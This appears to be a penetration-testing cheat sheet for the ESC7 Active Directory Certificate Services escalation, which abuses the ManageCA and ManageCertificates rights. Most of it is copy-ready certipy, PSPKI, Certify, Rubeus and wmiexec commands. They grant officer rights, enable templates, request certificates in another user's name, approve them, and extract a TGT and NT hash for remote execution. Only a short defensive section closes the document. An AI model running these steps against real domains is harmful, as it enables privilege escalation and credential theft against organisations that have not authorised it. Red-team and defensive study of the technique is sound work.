# ESC7—Vulnerable Certificate Authority Access Control

## Theory

A Certificate Authority (CA) exposes two powerful rights: **ManageCA** and **ManageCertificates**.

- **ManageCA** lets a principal change CA configuration (e.g., flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit that controls whether the CA accepts SANs supplied in requests). Changing some flags may require a CertSvc restart to take effect.
- **ManageCertificates** lets a principal approve/issue pending certificate requests, bypassing manager approval protections.
    Abuse of either (or both) can enable or accelerate template-based escalation chains (ESC1/ESC6/ESC3 etc.) by enabling SAN acceptance, enabling templates, issuing denied requests, or approving pending requests.

## Requirements

- An account with **ManageCA** and/or **ManageCertificates** on the target CA (or the ability to assign those rights).
- Ability to query the CA and submit certificate requests (e.g., domain user context with enroll rights on some templates).
 
---

## Linux—Enumerate & Abuse ManageCA

### Enumerate CA Permissions & Flags

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Inspect CA blocks for:
#  - 'ManageCa' or 'ManageCertificates' listed under Permissions
#  - 'User Specified SAN' (UserSpecifiedSAN / EDITF_ATTRIBUTESUBJECTALTNAME2)
#  - Request Disposition (Issue / Pending)
#  - Web Enrollment, Enforce Encryption for Requests
```

### Check Presence / State of SubCA Template (example)

```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -stdout
# Look for bult-in template named SubCA and whether Enabled: True
```

### Enable/disable CA Templates (requires ManageCA)

```bash
certipy ca -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -enable-template '<TEMPLATE_NAME>'
# or
certipy ca -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -disable-template '<TEMPLATE_NAME>'
```

### Add a Certificate Officer (grant ManageCertificates) (requires ManageCA)

```bash
certipy ca -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -add-officer <TARGET_PRINCIPAL>
# <TARGET_PRINCIPAL> can be a username or group that will receive ManageCertificates
```

### Create a Request that Will Pend (template Requires approval)

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn '<TARGET_UPN>'
# If 'Requires Manager Approval' is True or template pend flag set, note the Request ID and save private key when prompted (e.g., '<SAVED_KEYFILE>')
```

### Issue / Approve a pending Request (requires ManageCertificates)

```bash
certipy ca -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -issue-request <PENDING_REQUEST_ID>
```

### Retrieve an Issued Certificate

```bash
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -retrieve <PENDING_REQUEST_ID>
# cert and key saved to '<PFX_FILE>' (or saved PEM/key you combined)
```

### Use the Certificate (get TGT / NT hash)

```bash
certipy auth -pfx '<PFX_FILE>' -username '<TARGET_USER>' -domain '<DOMAIN>' -dc-ip <DC_IP>
# Produces <TARGET_USER>.ccache and may reveal NT hash
KRB5CCNAME=<TARGET_USER>.ccache wmiexec.py -k -no-pass <TARGET_FQDN>
```

---

## Windows—Enumerate & Abuse ManageCA / ManageCertificates

### Enumerate CA ACLs (PSPKI)

```powershell
Import-Module .\PSPKI.psd1
Get-CertificationAuthority -ComputerName '<CA_CONFIG_HOST>' | Get-CertificationAuthorityAcl | select -ExpandProperty access
# Look for 'ManageCA' and/or 'ManageCertificates' for identities
```

### Check CA EditFlags (certutil)

```powershell
certutil.exe -config "<CA_FQDN>\<CA_NAME>" -getreg "policy\EditFlags"
# Inspect returned EditFlags bits for EDITF_ATTRIBUTESUBJECTALTNAME2 presence
```

### Read/modify EditFlags via Script (requires ManageCA)

```powershell
# Example using a registry/COM helper (placeholder API)
$cfg = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD '<CA_CONFIG_HOST>'
$cfg.SetRootNode($true)
# Get current flags
$flags = $cfg.GetConfigEntry('EditFlags','PolicyModules\CertificateAuthority_MicrosoftDefault.Policy')
# Set new flags (value must be appropriate, e.g., enable or disable ATTRIBUTESUBJECTALTNAME2)
$cfg.SetConfigEntry(<NEW_FLAGS_VALUE>,'EditFlags','PolicyModules\CertificateAuthority_MicrosoftDefault.Policy')
# Note: CA service may require restart for some changes to take effect
```

### Approve / Issue pending Requests (requires ManageCertificates)

```powershell
# Find pending requests
Get-CertificationAuthority -ComputerName '<CA_CONFIG_HOST>' | Get-PendingRequest

# Approve a specific request
Get-CertificationAuthority -ComputerName '<CA_CONFIG_HOST>' | Get-PendingRequest -RequestID <PENDING_REQUEST_ID> | Approve-CertificateRequest
```

### Add a CA Officer (grant ManageCertificates) (requires ManageCA)

```powershell
Get-CertificationAuthority '<CA_CONFIG_HOST>' | Get-CertificationAuthorityAcl |
  Add-CertificationAuthorityAcl -Identity "<TARGET_PRINCIPAL>" -AccessType Allow -AccessMask "ManageCertificates" |
  Set-CertificationAuthorityAcl -RestartCA
```

### Request a Cert that Will Pend, save the Private Key

```powershell
.\Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<TARGET_UPN>
# If pending, capture the Request ID and copy the generated private key PEM output to a file ('<SAVED_KEYFILE>')
```

### Download/convert Approved Certificate and Build PFX

```powershell
.\Certify.exe download /ca:<CA_FQDN>\<CA_NAME> /id:<PENDING_REQUEST_ID> > issued.pem
# Append saved private key file content to the pem, then:
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in issued_with_key.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out '<PFX_FILE>'
```

### Use Certificate for PKINIT / Extract Creds

```powershell
.\Rubeus.exe asktgt /user:<TARGET_USER> /certificate:'<PFX_FILE>' /getcredentials /nowrap
# Grab base64 TGT or NTLM hash and proceed with standard Kerberos/ptt flows
```

---

## Practical Abuse Patterns

- **Flip CA flags** (ManageCA) to enable `UserSpecifiedSAN` so enrollment flows that accept SANs become usable. Some changes require a CA restart.
- **Add yourself as a CA officer** (ManageCertificates) and **issue pending or denied requests** to obtain certs you cannot directly enroll for.
- **Enable/disable templates** to make dangerous templates (e.g., SubCA or AnyPurpose) available.
- **Combine** ManageCA and ManageCertificates to both enable features and immediately approve requests, shortening escalation chains.

## Defensive Notes

- Lock down CA ACLs: restrict **ManageCA** and **ManageCertificates** to a small, audited group.
- Harden `EditFlags`: avoid enabling `EDITF_ATTRIBUTESUBJECTALTNAME2` unless necessary.
- Require authorized signatures / manager approval where practical and enforce encryption for ICPR/ICPR requests.
- Monitor CA ACL changes, pending requests, and template enable/disable events.
